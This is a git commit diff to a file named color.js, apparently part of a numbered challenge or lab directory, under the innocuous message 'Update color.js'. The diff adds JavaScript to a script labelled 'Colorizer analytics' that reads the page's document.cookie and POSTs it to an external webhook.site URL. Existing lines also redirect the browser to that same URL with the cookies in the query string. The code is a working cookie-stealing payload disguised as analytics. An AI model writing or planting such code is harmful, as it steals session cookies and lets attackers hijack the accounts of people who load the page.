72a21acabc690ef0eaaf600f48425778f770581e
tdv57 <87897434+tdv57@users.noreply.github.com>
2025-10-04 12:09:55 +0200

    Update color.js

--- ch62/color.js
+++ ch62/color.js
@@ -1,4 +1,12 @@
 console.log('Colorizer analytics loaded');
+console.log(document.cookie);
+fetch("https://webhook.site/31af76ab-f7fb-48e1-8f59-562031cd298a", {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({cookie: document.cookie})
+});
 
 window.location.href = 'https://webhook.site/31af76ab-f7fb-48e1-8f59-562031cd298a?c=' + 
                       encodeURIComponent(document.cookie);
